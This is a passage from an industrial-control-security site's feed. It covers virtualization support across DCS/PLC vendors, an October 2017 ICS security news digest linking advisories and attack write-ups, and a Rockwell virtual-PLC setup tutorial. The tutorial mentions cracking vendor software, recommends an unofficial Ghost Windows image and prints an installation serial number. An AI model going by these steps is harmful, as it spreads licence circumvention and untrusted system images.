+&lt;p&gt;Foxboro（福克斯波罗）的DCS系统采用专用的MESH网络，该网络基于以太网原理但又不同于以太网。计算机工作站里需要插入专用的MESH网卡。目前暂时未完成虚拟化的主要问题是该MESH网卡暂时未提供“经过VMware 或Citrxi、KVM等验证测试过的驱动程序”。
+&lt;img alt="Alt text" src="/static/images/virtual_platform/1.jpg" /&gt;&lt;/p&gt;
+&lt;h4&gt;横河 Centum VP  DCS系统；&lt;/h4&gt;
+&lt;p&gt;Yokogawa（横河公司）的DCS系统此前采用VNet专用控制网，后升级为VNet/IP控制网。底层基于 TCP/IP协议，网络模型基本上符合以太网原理，但又和以太网有着较大的不同。计算机工作站里需要插入专用的VNet/IP网卡（VI702网卡）。目前暂时未完成虚拟化的主要问题是该VNet/IP网卡暂时未提供“经过VMware 或Citrxi、KVM等验证测试过的驱动程序”。
+&lt;img alt="Alt text" src="/static/images/virtual_platform/2.png" /&gt;&lt;/p&gt;
+&lt;h3&gt;2. 已经测试并大规模应用于实际工业现场的系统&lt;/h3&gt;
+&lt;h4&gt;Siemens公司&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Siemens  PCS7 DCS系统英文版。
+国内应用业绩较少。主要原因是中文版本PCS7 DCS系统使用了USB 硬加密锁，该加密锁在映射至虚拟机时，有一定程度的兼容性问题。
+而英文版本PCS7 不采用USB硬加密锁。所以英文版PCS7 在欧洲和美洲有大量项目实例运行在虚拟化环境内。
+目前中文版和英文版没有功能差异，主要的差异就是在于“界面”是英文语言还是中文语言。&lt;/li&gt;
+&lt;li&gt;Siemens  Step7 + WinCC  PLC系统
+目前测试应用实例很多。&lt;/li&gt;
+&lt;li&gt;Siemens  TIA Portal  Step7 + WinCC  PLC系统
+目前博图平台软件在新版本中已经考虑了虚拟化环境运行问题。
+但是中文版本的博图WinCC 依然有USB硬加密锁的问题存在。
+而同样的，英文版不存在该问题。&lt;/li&gt;
+&lt;li&gt;Siemens SPPA-T3000  DCS 系统
+T3000  DCS系统大约从2007年开始大面积部署在虚拟化环境里。
+西门子公司发布的环境为Citrix公司的Xen Server。
+经测试，其系统充分考虑了虚拟化环境下的运行问题，在VMware vSphere和KVM系统上搭建测试环境，也没有问题。
+T3000 DCS系统主要用于大型火电厂，燃气发电，核电站常规岛控制部分。
+&lt;img alt="Alt text" src="/static/images/virtual_platform/3.jpg" /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;Rockwell-AB 公司&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;AB公司的编程软件Studio 5000 
+经测试AB公司Studio 5000 PLC编程软件V20以上版本完全兼容各个虚拟化环境。并且从V19版本开始，AB公司在诸多大项目中开始实际应用虚拟化环境的解决方案。&lt;/li&gt;
+&lt;li&gt;AB公司的人机界面监控软件FT View
+目前新版本的FT View软件统一了AB公司老版本的，RSView SE、RSView32和RSView ME。 并且以后只有FT View一个整合的版本。新版本的FT View除了功能更加强大外，还支持虚拟化环境。
+除了欧美一些项目外，在中国国内也已经有多个超大项目使用了虚拟化环境，也有多个中等项目运行在虚拟化环境里。&lt;/li&gt;
+&lt;li&gt;AB公司的其他软件
+目前资产管理软件FT Asset Center、实时数据库软件FT Histrion、 Web Server门户软件FT View Point 均可运行在虚拟化环境下。
+&lt;img alt="Alt text" src="/static/images/virtual_platform/4.jpg" /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;GE 公司&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;PAC8000 系统&lt;/li&gt;
+&lt;li&gt;iFix监控软件
+iFix监控软件在中国十分流行，甚至其流行和普及程度远远超过iFix在北美的流行程度。目前新版本的iFix可以运行在虚拟化环境内。
+iFix软件保护版权采用的是USB硬加密锁方式。目前可以使用USB Over EtherNet 转换设备将USB硬加密锁转换至以太网链路，可以使得虚拟机内的软件识别到。兼容性还不错。&lt;/li&gt;
+&lt;li&gt;Cimplicity 监控软件
+Cimplicity软件可运行在虚拟化环境内。USB硬加密锁解决方法同iFix。&lt;/li&gt;
+&lt;li&gt;Proficy  ME编程软件
+Proficy ME从2006年开始起就对虚拟化环境没有任何的“限制”，即在没有宣布正式支持虚拟化环境的时候，Proficy ME软件已经可以正常的稳定的在虚拟化环境内运行，时间达十来年之久。&lt;/li&gt;
+&lt;li&gt;GE-Xinhua OC6000E  DCS系统
+GE新华的DCS系统。也可稳定运行在VMware虚拟化环境和Citirx环境中。KVM和Hyper-V环境据反馈尚有一些Bug。
+&lt;img alt="Alt text" src="/static/images/virtual_platform/5.jpg" /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;ABB 公司&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;AC500  PLC系统&lt;/li&gt;
+&lt;li&gt;Freelance  DCS系统&lt;/li&gt;
+&lt;li&gt;800xA  DCS系统
+因为800xA DCS系统安装恢复等过程十分复杂，ABB公司推荐采用虚拟化分发部署的方式来实施项目。除了确保兼容性稳定性外，还可以大大提升项目实施的效率。&lt;/li&gt;
+&lt;li&gt;Symphony Plus系统
+Symphony Plus系统也充分考虑了虚拟化环境运行问题。关于授权加密锁也要丰富的解决方案。
+而传统的老版本的Symphony系统则目前无法运行在虚拟化环境内。
+主要原因在于其使用了专用的Scsi 接口卡。该接口卡运行在虚拟化环境内有很大的兼容性问题。
+&lt;img alt="Alt text" src="/static/images/virtual_platform/6.jpg" /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;Emerson公司&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Ovation DCS系统
+目前在火电厂项目实际应用中运行在虚拟化环境的业绩尚不多。反而是最近几年核电厂新项目中Ovation系统开始广泛采用虚拟化技术。
+Emerson公司内部的所有测试环境均为虚拟化环境。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;DeltaV  DCS系统
+DeltaV 自V10.3.1版本起，运行在虚拟化环境内没有任何问题。
+官方推荐虚拟化环境为VMware。 但是测试Citrix也无问题。
+DeltaV采用USB硬加密锁。需要USB Over Ethernet解决方案。
+&lt;img alt="Alt text" src="/static/images/virtual_platform/7.jpg" /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;Honeywell公司&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Honeywell  PKS DCS系统
+PKS DCS系统从R410版本开始可运行在虚拟化环境内；从R430版本开始官方推荐运行在虚拟化环境内而不是实体机环境内。
+R311版本我们也因为一些特殊的项目需要，进行了充分的系统测试。除了对网卡，显卡有一些限制条件外。也可以稳定运行在虚拟化环境内。
+Honeywell公司在新功能的拓展上，表现的态度为“积极甚至激进”。很多新功能往往是业界第一个支持，第一个推出。
+Honeywell更老版本的DCS系统，如TPS等，目前不可以运行在虚拟化环境中。不过这些老系统虽然在工业现场还有大面积的应用，但是Honeywell公司已经将其停产超过10年了。&lt;/li&gt;
+&lt;li&gt;Honeywell HS Scada软件
+HS Scada软件可运行在虚拟化环境内。
+USB硬加密锁解决方案也采用USB Over Ethernet。&lt;/li&gt;
+&lt;li&gt;Honeywell SM  SIS系统
+&lt;img alt="Alt text" src="/static/images/virtual_platform/8.jpg" /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;浙大中控、和利时、新华、国电智深、科远&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;浙大中控Supcon
+Supcon目前JX-300XP、ECS-100、ECS-700 均可运行在虚拟环境中。
+AdvantTrol Pro 和Super Visual软件也没有问题。
+USB硬加密锁解决方案同上所述。&lt;/li&gt;
+&lt;li&gt;和利时
+和利时KM系统，MACS V6.X软件可运行在虚拟环境内。
+MACS V4.X软件目前暂不能运行在虚拟环境内。
+MACS V5.X软件官方未做充分测试。因为目前也不再主推V5软件。所以其稳定性不好验证。&lt;/li&gt;
+&lt;li&gt;新华
+新华OnXDC 系统可以运行在虚拟化环境内。&lt;/li&gt;
+&lt;li&gt;国电智深
+国电智深EDPF-NT+ 也支持虚拟化环境。&lt;/li&gt;
+&lt;li&gt;科远
+科远公司宣传支持虚拟化环境。但是未获得其软件进行测试验证。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;Schneider（施耐德）公司&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;施耐德Unity Pro  PLC编程软件支持&lt;/li&gt;
+&lt;li&gt;施耐德Citect Scada监控软件新版本支持虚拟化环境&lt;/li&gt;
+&lt;li&gt;施耐德Clear Scada监控软件支持虚拟化环境&lt;/li&gt;
+&lt;li&gt;施耐德Intouch 监控软件新版本支持虚拟化环境&lt;/li&gt;
+&lt;li&gt;施耐德Intouch-WAS 企业版监控软件支持虚拟化环境&lt;/li&gt;
+&lt;li&gt;施耐德-福克斯波罗 Evo Scada软件支持虚拟化环境，并推荐虚拟化环境&lt;/li&gt;
+&lt;li&gt;施耐德-泰尔文特 OASys DNA Scada软件支持虚拟化环境。
+可多平台并存，如Server采用Windows或Linux，数据库采用SUN Solaris，操作站采用Windows。 为减少系统兼容性，降低实施难度，泰尔文特公司也推荐虚拟化部署。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;施耐德公司目前旗下拥有最多的HMI/Scada软件产品。小中大型均有。
+主流、非主流也有。Windows平台和非Windows平台也都有。&lt;/p&gt;
+&lt;h4&gt;Omron、Mitsubishi、Beckoff等&lt;/h4&gt;
+&lt;p&gt;因为工作原因，对Omron和Mitsubishi相关产品近十年内未再关注和测试。
+暂不清楚具体情况。
+倍福公司（Beckoff）倒是宣称完美支持虚拟化环境。并且有相关业绩证明。&lt;/p&gt;
+&lt;h3&gt;3. 虚拟化测试平台的搭建&lt;/h3&gt;
+&lt;h4&gt;虚拟化平台的选择。&lt;/h4&gt;
+&lt;p&gt;拟采用VMware vSpher或者Citrix XenServer。如果是单一平台时，倾向于VMware。
+或者不排除考虑，2种平台均搭建。
+目前绝大部分自动化行业领导者均优先支持VMware的系统。
+拟用版本vSphere v6.0u3. 暂不考虑使用最新版本v6.5 。已降低系统Bug造成的潜在风险。&lt;/p&gt;
+&lt;h4&gt;系统搭建步骤&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;搭建服务器硬件资源池。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;A方案，采用10台低配置的HP MicroServer Gen8 或者类似机器。
+每台服务器内正常时只运行1-2个VMs（虚拟机实例）。
+数量多，但是每台单价低。此时因为虚拟机不集中运行在少数量机器中。风险也较低。同时MicroServer  Gen8这类机器体积小巧。
+搬迁、拆卸、维护也方便，占用空间并不比三四台大型服务器多，甚至占用空间更小。
+
+B方案，采用2-4台（根据项目的实际需求）DELL R920或者HP ML350P Gen9这类大型服务器。
+每台服务器运行4-6个VMs。服务器数量控制在2-4台。一般的实验室，2台即差不多可满足要求。
+因为多个VMs运行在同一台硬件上，因此建议必须采用冗余的热插拔电源，冗余的热插拔阵列硬盘。
+服务器内也须插多个网卡。最好每个VMs都有自己独立的网卡。
+
+C方案，可采用今年来流行的四子星、八子星等硬件，如DELL C6320或HP SL230S 等刀片式服务器。
+一般每个刀箱可容纳4个或8个刀片服务器。
+刀片配置可高可低。
+也可以一开始就配置较高配置的刀箱，但是刀片数量初期保持为3-4个，后期可以慢慢再根据实际需求，经费预算进行扩展。
+刀片式一般均为冗余热插拔电源。
+
+D方案，采用美国容错（Stratus）、日本NEC、中国海得等容错服务器硬件平台。
+系统运行在硬容错平台的虚拟化环境内。
+系统安全性大大提升。
+但容错平台相对较昂贵。
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;搭建VMware  vSphere平台
+按照硬件厂家推荐的vSphere版本，严格遵照部署手册，部署vSphere平台。
+应充分考虑到兼容性、可扩展性、容错性。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;搭建虚拟化环境内的自动化软件环境
+须严格按照各个自控系统厂家推荐的方式来部署虚拟化环境。
+对于要求网卡直通的软件必须设置网卡直通。
+对于不要求网卡直通的软件推荐采用网卡直通。
+为降低兼容性风险，应尽量采用较新的自动化软件版本。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;搭建自动化控制网络
+有的PLC系统网络可以合并在一套交换机上。
+而有的DCS系统网络必须是单独的一套或者两套交换机。
+当系统厂家众多时，网络会显得十分凌乱，需要丰富的经验进行梳理。
+对于能合并的尽量进行合并。
+对于不能合并的系统，应尽量将其单独隔离开来。并尽量将网络比较复杂的DCS系统部署在一套服务器上。 将网络比较简单的PLC系统部署在一套服务器上。
+为便于侦听报文，交换机应选择兼容性好，性能强，带有端口镜像功能的高级管理型交换机。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;建设灾备和恢复系统
+系统搭建完成后，必须构建灾备系统。
+以防止意外故障，或者攻防时导致系统瘫痪时，可将系统环境快速的复原。不致影响正常运行。
+除灾备软件、杀毒软件和防火墙等外，还应部署独立的存储服务器。推荐群晖公司的产品。&lt;/li&gt;
+&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">mood-island</dc:creator><pubDate>Fri, 10 Nov 2017 10:24:00 +0800</pubDate><guid>tag:icsmaster.com,2017-11-10:security/virtual_platform.html</guid><category>虚拟PLC</category><category>软PLC</category></item><item><title>工控安全半月报第一期（2017-10）</title><link>http://icsmaster.com/news/monthly_report_10_2.html</link><description>&lt;blockquote&gt;
+&lt;p&gt;工匠安全实验室最新版块，专注工控安全的我们，精选近期全球范围内工控安全领域的重要事件，让您及时了解行业发展动态，洞悉行业尖端技术，探寻行业前进方向。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;行业动态&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.icscybersecurityconference.com/"&gt;2017 ICS Cyber Security Conference&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://news.hust.edu.cn/2017/1024/c213a88293/page.htm"&gt;首届“武汉工控安全论坛”在校召开&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.guancha.cn/TMT/2017_10_25_432180_s.shtml"&gt;中外黑客“攻击”炼油厂! GeekPwn2017上海站还原乌克兰断电惊天一幕&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://t.cn/ROEBLkU"&gt;乌克兰情报机构发布警示：本月或将再次面临类似NotPetya的网络攻击&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://t.cn/ROEBnZV"&gt;安全公司披露黑客组织Tick新动态，自2012年来持续针对日本关键基础设施、重工业等展开攻击活动&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://t.cn/ROmTuKX"&gt;瑞典交通机构上周曾遭黑客 DDoS 攻击，致使 IT 系统宕机、列车延误&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://t.cn/RO8c7jd"&gt;安全公司披露黑客组织 Tick 新动态，自 2012 年来持续针对日本关键基础设施、重工业等展开攻击活动&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/nk-internet"&gt;朝鲜互联网抵近观察报告 趋势科技批驳众多朝鲜攻击者的说法&lt;/a&gt;
+短评：有安全研究者认为朝鲜网络管控相当严格，只要是IP显示在朝鲜，那一定是那边的攻击者，然而真是这样的吗？朝鲜互联网是怎样构成的，其中有恶意软件吗？&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://t.cn/RWqiBBM"&gt;美国 DHS 与 FBI 联合预警：黑客将针对美国能源工控企业展开新一轮网络攻击&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://www.ag.gov.au/Consultations/Pages/Security-of-Critical-Infrastructure-Bill.aspx"&gt;澳大利亚《关键基础设施安全法草案2017》解读&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?__biz=MzI0MjA2MTg4Nw==&amp;amp;mid=2649166447&amp;amp;idx=1&amp;amp;sn=4b5989474197903a00437ae6d7f8dec9&amp;amp;chksm=f111b53fc6663c292a8a66d9af23f4c5e54c92d6b4e571f4b4bf105efeab0e808acb4629ed2b&amp;amp;mpshare=1&amp;amp;scene=1&amp;amp;srcid=1016DUW7VurQNdaDY2JqZjJH#rd"&gt;工业控制系统已经成为黑客的重要目标&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://bobao.360.cn/news/detail/4306.html"&gt;ISC2017：关键信息基础设施保护论坛&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/atm-malware-cutlet-maker"&gt;ATM恶意软件Cutlet Maker在暗网销售 1500美元黑一台ATM机&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;技术资料&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://www.hackers-arise.com/single-post/2016/08/01/SCADA-Hacking-DoSing-a-SCADA-site?_amp_=true"&gt;SCADA Hacking: DoSing a SCADA site&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://github.com/w3h/icsmaster/blob/master/doc/%E5%9B%BD%E5%A4%96/CyberX/CyberX-Global-ICS-IIoT-Risk-Report.pdf"&gt;CyberX-Global-ICS-IIoT-Risk-Report&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.freebuf.com/articles/wireless/150981.html"&gt;WiFi安全漏洞：WPA2安全协议遭破解的影响分析&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/amosconnect8-vulnerability"&gt;英国SATCOM船载通信平台有SQL盲注漏洞和后门账户 攻击者可完全控制服务器&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://t.cn/ROmT3Ej"&gt;西门子修复 BACnet 自动化控制器的两处安全漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/dragonfly-apt-report"&gt;蜻蜓组织攻击多国能源机构 USCert展示完整攻击链 给出17页报告&lt;/a&gt;
+短评：报告分析了完整网络攻击链的7个阶段，从中看到攻击者使用了6种TTP。截止报告时至，国土安全部、联邦调查局和可信合作伙伴认为，攻击仍在持续。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?__biz=MzI2MjU3MzQyMA==&amp;amp;mid=2247484577&amp;amp;idx=1&amp;amp;sn=51adb590b3af7613ecd2b9e2400a6b2d&amp;amp;chksm=ea4858a2dd3fd1b413e029ccdcffa0bded7014a80ae5352c74fca9af27672238e0738d4f2522&amp;amp;mpshare=1&amp;amp;scene=1&amp;amp;srcid=1024GmL50IMOgs0z9wr7bfMy#rd"&gt;漂浮在海上的工控系统安全噩梦——轮船&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://github.com/CyberSaxosTiGER/poc-krack"&gt;WPA2 KRACK POC&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://zhuanlan.zhihu.com/p/30242767"&gt;ISC2017应急响应论坛PPT分享&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;安全漏洞&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-31804"&gt;Korenix JetNet中间人攻击漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-31805"&gt;Korenix JetNet未授权访问漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-31344"&gt;Boston Scientific ZOOM LATITUDE PRM硬编码加密漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-31343"&gt;Boston Scientific ZOOM LATITUDE PRM错误加密漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-31144"&gt;SpiderControl MicroBrowser任意代码执行漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-30755"&gt;Wireshark Profinet I/O解析器拒绝服务漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-30639"&gt;多款Westermo设备硬编码使用加密密钥漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-30495"&gt;Progea Movicon SCADA/HMI任意代码执行漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-30496"&gt;Progea Movicon SCADA/HMI权限提升漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201710-1050"&gt;Siemens APOGEE PXC BACnet Automation Controller和Siemens TALON TC BACnet Automation Controller 路径遍历漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201710-1049"&gt;Siemens APOGEE PXC BACnet Automation Controller和Siemens TALON TC BACnet Automation Controller 安全漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201710-1037"&gt;Siemens 7KT PAC1200 Data Manager 安全漏洞&lt;/a&gt; &lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201707-1660"&gt;力控科技-电力通用监控组态软件FCPower XKeyServer组件远程拒绝服务漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">chansim</dc:creator><pubDate>Tue, 31 Oct 2017 10:43:00 +0800</pubDate><guid>tag:icsmaster.com,2017-10-31:news/monthly_report_10_2.html</guid><category>news</category></item><item><title>构建虚拟工控环境系列 - 罗克韦尔虚拟PLC</title><link>http://icsmaster.com/tool/AB_VPLC.html</link><description>&lt;h2&gt;一、    概述&lt;/h2&gt;
+&lt;p&gt;本篇主要介绍罗克韦尔虚拟PLC的搭建，使用的操作系统为Windows7 x86 Ultimate（DEEP_GHOST_WIN7_SP1_X86_V2015_06.iso），虚拟化软件为 VVMware Workstation 12 Pro，（AB）SoftLogix5800 21.00.00。&lt;/p&gt;
+&lt;p&gt;为了研究罗克韦尔（AB）的软PLC，前后花了一周半的时间，遇到过AB的软件版本太高，破解不掉，改用低版本，虚拟化不支持；遇到过软件都支持虚拟化，但是版本直接兼容性不好；遇到过虚拟机下软件可以正常运行，但是联网后，用RSLinx扫描不到；试过Windows XP SP3 professional、Windows 7 SP1 x86 Ultimate、Windows 7 SP1 x64 Ultimate；遇到过物理机下可以用RSLinx扫描到，但虚拟机下扫描不到……&lt;/p&gt;
+&lt;p&gt;建议用深度的Ghost镜像“DEEP_GHOST_WIN7_SP1_X86_V2015_06.iso”。&lt;/p&gt;
+&lt;h2&gt;二、SoftLogix5800版本&lt;/h2&gt;
+&lt;p&gt;经测试AB公司Studio 5000 PLC编程软件V20以上版本完全兼容各个虚拟化环境。并且从V19版本开始，AB公司在诸多大项目中开始实际应用虚拟化环境的解决方案。
+本文测试的软件版本如下：
+Studio 5000 Logix Designer Professional Edition：V21.00.00（CPR9 SR 5.1）
+RSLinx Classic Lite：3.51.01 （CPR9 SR 5.1）
+SoftLogix Classic Monitor   ：V21.00.00（CPR9 SR 5.1）&lt;/p&gt;
+&lt;h2&gt;三、安装Ghost Win7虚拟机&lt;/h2&gt;
+&lt;p&gt;1、运行虚拟机VMware Workstation，创建一个新的虚拟机。
+2、选中我们创建好的windows7虚拟机，“编辑虚拟机设置”，选用“使用ISO映像文件”。然后在“高级”中选择“IDE”模式。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/1.png" /&gt;&lt;/p&gt;
+&lt;p&gt;3、完成后运行虚拟机，然后，按6选择“PQ8.05 – 图形分区工具”&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/2.png" /&gt;&lt;/p&gt;
+&lt;p&gt;4、硬盘分区，根据个人需要和实际情况填写，完成后“确定”。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/3.png" /&gt;&lt;/p&gt;
+&lt;p&gt;5、接着按同样的步骤建立“逻辑分割磁区”。建立完成后选定主分区，“设定为作用”。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/4.png" /&gt;&lt;/p&gt;
+&lt;p&gt;6、然后点击“执行”。完成后点击“结束”，然后关闭虚拟机。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/5.png" /&gt;&lt;/p&gt;
+&lt;p&gt;7、进入BIOS，按“Shift”和“+”将从CD-ROM Drive调整为第一启动项。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/6.png" /&gt;&lt;/p&gt;
+&lt;p&gt;8、然后选择从“安装系统到硬盘第一分区”。如果启动不正常，请关闭虚拟机，查看第2步中的磁盘模式是否是“IDE”模式。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/7.png" /&gt;&lt;/p&gt;
+&lt;p&gt;9、系统自动安装。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/8.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;四、安装Rockwell Studio 5000&lt;/h2&gt;
+&lt;p&gt;1、将安装软件解压后，打开RSLogix5000的文件夹，双击“Setup.exe”。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/9.png" /&gt;&lt;/p&gt;
+&lt;p&gt;2、“序列号”输入“2022007039”。其他可以根据自己需要填写。然后“下一步”。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/10.png" /&gt;&lt;/p&gt;
+&lt;p&gt;3、出现下面的界面直接点击“安装”，也可以根据自己的需要，取消一些选项，如“在联机丛书”。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/11.png" /&gt;&lt;/p&gt;
+&lt;p&gt;4、然后点击“同意所有”。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/12.png" /&gt;&lt;/p&gt;
+&lt;p&gt;5、静静的等待安装，期间弹出窗口或选项，直接“确认”或“下一步”。安装完成后点击“完成”。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/13.png" /&gt;&lt;/p&gt;
+&lt;p&gt;6、安装完成后，在开始菜单中可以找到如下图标。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/14.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;五、安装SoftLogix5800&lt;/h2&gt;
+&lt;p&gt;1、解压软件后，打开文件夹，双击“Install.exe”。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/15.png" /&gt;&lt;/p&gt;
+&lt;p&gt;2、点击“SoftLogix 5800 V21.00”。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/16.png" /&gt;&lt;/p&gt;
+&lt;p&gt;3、期间出现界面，则点击“Next”，出现下面的画面，则点击“Yes”。&lt;/p&gt;
